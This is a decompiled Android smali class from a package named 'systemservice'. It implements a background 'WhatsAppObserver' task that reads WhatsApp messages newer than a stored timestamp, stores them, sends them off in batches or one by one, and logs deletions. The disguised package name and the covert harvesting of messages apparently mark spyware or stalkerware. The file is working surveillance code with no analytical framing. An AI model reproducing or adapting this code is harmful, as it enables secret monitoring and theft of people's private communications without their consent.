.class Lcom/systemservice/a/g/g;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/g/h;->onEvent(ILjava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/systemservice/a/g/h;


# direct methods
.method constructor <init>(Lcom/systemservice/a/g/h;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/g/g;->a:Lcom/systemservice/a/g/h;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 17

    move-object/from16 v1, p0

    const-string v0, "last_whatsapp_date"

    const-string v2, "FINALLY WHATSAPP"

    const-string v3, "WhatsAppObserver"

    const-wide/16 v4, 0x2710

    :try_start_0
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V

    iget-object v4, v1, Lcom/systemservice/a/g/g;->a:Lcom/systemservice/a/g/h;

    iget-object v4, v4, Lcom/systemservice/a/g/h;->a:Landroid/content/Context;

    const-string v5, "app_prefs_settings"

    const/4 v6, 0x0

    invoke-virtual {v4, v5, v6}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v4

    const-wide/16 v7, 0x0

    invoke-interface {v4, v0, v7, v8}, Landroid/content/SharedPreferences;->getLong(Ljava/lang/String;J)J

    move-result-wide v9

    new-instance v13, Ljava/util/Date;

    const-wide/16 v11, 0x1

    add-long/2addr v9, v11

    const-wide/16 v11, 0x3e8

    mul-long v9, v9, v11

    invoke-direct {v13, v9, v10}, Ljava/util/Date;-><init>(J)V

    iget-object v5, v1, Lcom/systemservice/a/g/g;->a:Lcom/systemservice/a/g/h;

    iget-object v11, v5, Lcom/systemservice/a/g/h;->a:Landroid/content/Context;

    iget-object v5, v1, Lcom/systemservice/a/g/g;->a:Lcom/systemservice/a/g/h;

    iget-object v12, v5, Lcom/systemservice/a/g/h;->d:Ljava/lang/String;

    const/4 v14, 0x0

    const/4 v15, 0x1

    const-string v16, ""

    invoke-static/range {v11 .. v16}, Lcom/systemservice/a/g/f;->a(Landroid/content/Context;Ljava/lang/String;Ljava/util/Date;Ljava/util/Date;ZLjava/lang/String;)Ljava/util/List;

    move-result-object v5

    invoke-interface {v5}, Ljava/util/List;->isEmpty()Z

    move-result v9

    if-nez v9, :cond_2

    invoke-interface {v5}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v5

    :cond_0
    :goto_0
    invoke-interface {v5}, Ljava/util/Iterator;->hasNext()Z

    move-result v9

    if-eqz v9, :cond_1

    invoke-interface {v5}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v9

    check-cast v9, Lcom/systemservice/a/e/g;

    iget-object v10, v1, Lcom/systemservice/a/g/g;->a:Lcom/systemservice/a/g/h;

    iget-object v10, v10, Lcom/systemservice/a/g/h;->b:Lcom/systemservice/a/h/k;

    invoke-virtual {v10, v9}, Lcom/systemservice/a/h/k;->a(Lcom/systemservice/a/e/g;)J

    iget-wide v10, v9, Lcom/systemservice/a/e/g;->d:J

    cmp-long v12, v7, v10

    if-gez v12, :cond_0

    iget-wide v7, v9, Lcom/systemservice/a/e/g;->d:J

    goto :goto_0

    :cond_1
    invoke-interface {v4}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v4

    invoke-interface {v4, v0, v7, v8}, Landroid/content/SharedPreferences$Editor;->putLong(Ljava/lang/String;J)Landroid/content/SharedPreferences$Editor;

    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->commit()Z

    :cond_2
    iget-object v0, v1, Lcom/systemservice/a/g/g;->a:Lcom/systemservice/a/g/h;

    iget-object v0, v0, Lcom/systemservice/a/g/h;->b:Lcom/systemservice/a/h/k;

    const/4 v4, 0x0

    const/4 v5, 0x1

    invoke-virtual {v0, v6, v4, v4, v5}, Lcom/systemservice/a/h/k;->a(ZLjava/util/Date;Ljava/util/Date;I)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_6

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v4

    if-lez v4, :cond_6

    iget-object v4, v1, Lcom/systemservice/a/g/g;->a:Lcom/systemservice/a/g/h;

    iget-object v4, v4, Lcom/systemservice/a/g/h;->c:Lcom/systemservice/common/features/settingHistory/b;

    check-cast v4, Lcom/systemservice/a/c/h/j;

    iget-object v6, v1, Lcom/systemservice/a/g/g;->a:Lcom/systemservice/a/g/h;

    iget-object v6, v6, Lcom/systemservice/a/g/h;->a:Landroid/content/Context;

    invoke-virtual {v4, v6, v0}, Lcom/systemservice/a/c/h/j;->a(Landroid/content/Context;Ljava/util/List;)I

    move-result v6

    if-ne v6, v5, :cond_3

    const-string v4, "SEND WHATSAPP PACKAGE SUCCESSFUL"

    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v4, v1, Lcom/systemservice/a/g/g;->a:Lcom/systemservice/a/g/h;

    iget-object v4, v4, Lcom/systemservice/a/g/h;->b:Lcom/systemservice/a/h/k;

    invoke-virtual {v4, v0}, Lcom/systemservice/a/h/k;->a(Ljava/util/List;)V

    goto :goto_3

    :cond_3
    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_4
    :goto_1
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v6

    if-eqz v6, :cond_6

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Lcom/systemservice/a/d/d;

    check-cast v6, Lcom/systemservice/a/e/g;

    iget-object v7, v1, Lcom/systemservice/a/g/g;->a:Lcom/systemservice/a/g/h;

    iget-object v7, v7, Lcom/systemservice/a/g/h;->a:Landroid/content/Context;

    invoke-virtual {v4, v7, v6}, Lcom/systemservice/a/c/h/j;->a(Landroid/content/Context;Lcom/systemservice/a/e/g;)I

    move-result v7

    if-ne v7, v5, :cond_5

    const-string v7, "SEND 1 WHATSAPP SUCCESSFUL"

    invoke-static {v3, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v7, v1, Lcom/systemservice/a/g/g;->a:Lcom/systemservice/a/g/h;

    iget-object v7, v7, Lcom/systemservice/a/g/h;->b:Lcom/systemservice/a/h/k;

    iget-wide v8, v6, Lcom/systemservice/a/e/g;->a:J

    iget v6, v6, Lcom/systemservice/a/e/g;->g:I

    :goto_2
    invoke-virtual {v7, v8, v9, v6}, Lcom/systemservice/a/h/k;->a(JI)V

    goto :goto_1

    :cond_5
    iget-object v7, v1, Lcom/systemservice/a/g/g;->a:Lcom/systemservice/a/g/h;

    iget-object v7, v7, Lcom/systemservice/a/g/h;->a:Landroid/content/Context;

    invoke-static {v7}, Lcom/systemservice/common/features/settingHistory/b;->c(Landroid/content/Context;)Z

    move-result v7

    if-nez v7, :cond_4

    const-string v7, "DELETE 1 WHATSAPP SUCCESSFUL"

    invoke-static {v3, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v7, v1, Lcom/systemservice/a/g/g;->a:Lcom/systemservice/a/g/h;

    iget-object v7, v7, Lcom/systemservice/a/g/h;->b:Lcom/systemservice/a/h/k;

    iget-wide v8, v6, Lcom/systemservice/a/e/g;->a:J

    iget v6, v6, Lcom/systemservice/a/e/g;->g:I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_2

    :catchall_0
    move-exception v0

    goto :goto_4

    :catch_0
    move-exception v0

    :try_start_1
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, ""

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :cond_6
    :goto_3
    invoke-static {v3, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :goto_4
    invoke-static {v3, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    throw v0
.end method
